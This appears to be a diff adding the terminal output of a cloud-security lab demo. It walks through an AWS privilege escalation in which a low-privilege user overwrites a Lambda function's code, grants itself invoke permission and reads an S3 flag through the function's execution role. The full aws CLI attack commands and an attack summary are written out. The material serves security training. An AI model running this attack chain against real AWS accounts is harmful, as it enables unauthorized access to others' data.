@@ -1,0 +1,116 @@
+[0;32m========================================[0m
+[0;32mLambda UpdateFunctionCode + AddPermission to S3 Bucket Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-lambda-005-to-bucket-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Target bucket: pl-prod-lambda-005-to-bucket-697683661464-66pzel
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33mPre-flight: Removing any stale Lambda resource policy statements[0m
+[0;32m✓ No resource policy on Lambda (clean state)[0m
+
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-lambda-005-to-bucket-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying starting user has no S3 access and no Lambda invoke permission[0m
+Attempting to list target bucket contents (should fail)...
+[2m[Attacker] $ aws s3 ls s3://pl-prod-lambda-005-to-bucket-697683661464-66pzel/[0m
+[0;32m✓ Confirmed: Cannot access S3 bucket (as expected)[0m
+
+Attempting to invoke target Lambda directly (should fail — no resource policy yet)...
+[2m[Attacker] $ aws lambda invoke --region us-east-1 --function-name pl-prod-lambda-005-to-bucket-target-lambda --payload '{}' /tmp/preflight_response.json[0m
+[0;32m✓ Confirmed: Cannot invoke Lambda without resource policy (as expected)[0m
+
+[1;33mStep 5: Getting target Lambda function details[0m
+Target Lambda function: pl-prod-lambda-005-to-bucket-target-lambda
+[2m[ReadOnly] $ aws lambda get-function --region us-east-1 --function-name pl-prod-lambda-005-to-bucket-target-lambda --query 'Configuration.FunctionArn' --output text[0m
+Lambda ARN: arn:aws:lambda:us-east-1:123456789012:function:pl-prod-lambda-005-to-bucket-target-lambda
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Starting user ARN: arn:aws:iam::123456789012:user/pl-prod-lambda-005-to-bucket-starting-user
+[0;32m✓ Found target Lambda function[0m
+
+[1;33mStep 6: Creating malicious Lambda code[0m
+Creating Python code that will read the S3 flag via the Lambda execution role...
+[0;32m✓ Created malicious Lambda code[0m
+
+[1;33mStep 7: Updating Lambda function with malicious code[0m
+Using lambda:UpdateFunctionCode permission to replace the function's code...
+
+[0;36m[Attacker] $ aws lambda update-function-code --region us-east-1 --function-name pl-prod-lambda-005-to-bucket-target-lambda --zip-file fileb:///tmp/lambda_function.zip[0m
+[0;32m✓ Successfully updated Lambda function code[0m
+
+[1;33mWaiting 15 seconds for Lambda to process code update...[0m
+[0;32m✓ Lambda update processed[0m
+
+[1;33mStep 8: Adding resource-based permission to invoke the Lambda function[0m
+Using lambda:AddPermission to grant our own user the right to invoke the function...
+Without this, even lambda:InvokeFunction in the identity policy is blocked by the absence of a resource policy.
+
+[0;36m[Attacker] $ aws lambda add-permission --region us-east-1 --function-name pl-prod-lambda-005-to-bucket-target-lambda --statement-id "AllowStartingUserInvoke-1779036507" --action lambda:InvokeFunction --principal arn:aws:iam::123456789012:user/pl-prod-lambda-005-to-bucket-starting-user[0m
+[0;32m✓ Successfully added invoke permission for pl-prod-lambda-005-to-bucket-starting-user[0m
+
+[1;33mStep 9: Invoking malicious Lambda function to read S3 flag[0m
+The Lambda will execute as pl-prod-lambda-005-to-bucket-lambda-exec-role which has s3:GetObject on the target bucket...
+Passing the target bucket name in the event payload so the payload knows where to read the flag from...
+
+[0;36m[Attacker] $ aws lambda invoke --region us-east-1 --function-name pl-prod-lambda-005-to-bucket-target-lambda --payload '{"bucket": "pl-prod-lambda-005-to-bucket-697683661464-66pzel"}' /tmp/response.json[0m
+Lambda response:
+{
+  "statusCode": 200,
+  "body": "{\"flag\": \"flag{lambda_005_bucket_accessed}\"}"
+}
+
+[0;32m✓ Lambda execution successful — flag extracted from S3 via Lambda execution role[0m
+[0;32m✓ BUCKET ACCESS CONFIRMED[0m
+
+[1;33mStep 10: Capturing CTF flag[0m
+The flag was returned by the Lambda function which read it from s3://pl-prod-lambda-005-to-bucket-697683661464-66pzel/flag.txt
+
+[0;36m[Attacker] $ cat /tmp/response.json | jq -r '.body | fromjson | .flag'[0m
+[0;32m✓ Flag captured: flag{lambda_005_bucket_accessed}[0m
+
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-lambda-005-to-bucket-starting-user (no S3 access, no Lambda invoke permission)
+2. Used lambda:UpdateFunctionCode to replace pl-prod-lambda-005-to-bucket-target-lambda with code that reads s3://pl-prod-lambda-005-to-bucket-697683661464-66pzel/flag.txt
+3. Used lambda:AddPermission to grant ourselves invoke permission on the function
+4. Invoked the modified Lambda with the bucket name in the event payload — it executed as pl-prod-lambda-005-to-bucket-lambda-exec-role which has s3:GetObject
+5. Extracted flag from Lambda response: flag{lambda_005_bucket_accessed}
+
+[1;33mAttack Path:[0m
+  pl-prod-lambda-005-to-bucket-starting-user → (lambda:UpdateFunctionCode) → pl-prod-lambda-005-to-bucket-target-lambda (modified)
+  → (lambda:AddPermission) → Allow self-invoke
+  → (lambda:InvokeFunction) → Execute as pl-prod-lambda-005-to-bucket-lambda-exec-role
+  → (s3:GetObject flag.txt) → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws lambda update-function-code --region us-east-1 --function-name pl-prod-lambda-005-to-bucket-target-lambda --zip-file fileb:///tmp/lambda_function.zip[0m
+  [0;36m$ aws lambda add-permission --region us-east-1 --function-name pl-prod-lambda-005-to-bucket-target-lambda --statement-id "AllowStartingUserInvoke-1779036507" --action lambda:InvokeFunction --principal arn:aws:iam::123456789012:user/pl-prod-lambda-005-to-bucket-starting-user[0m
+  [0;36m$ aws lambda invoke --region us-east-1 --function-name pl-prod-lambda-005-to-bucket-target-lambda --payload '{"bucket": "pl-prod-lambda-005-to-bucket-697683661464-66pzel"}' /tmp/response.json[0m
+  [0;36m$ cat /tmp/response.json | jq -r '.body | fromjson | .flag'[0m
+
+[1;33mAttack Artifacts:[0m
+- Modified Lambda function code: pl-prod-lambda-005-to-bucket-target-lambda
+- Added resource-based permission statement: AllowStartingUserInvoke-1779036507
+- Temporary files: /tmp/lambda_function.py, /tmp/lambda_function.zip, /tmp/response.json
+
+[0;31m⚠ Warning: Lambda function contains malicious code and has a resource policy allowing self-invoke[0m
+[1;33mTo clean up and restore the original state:[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
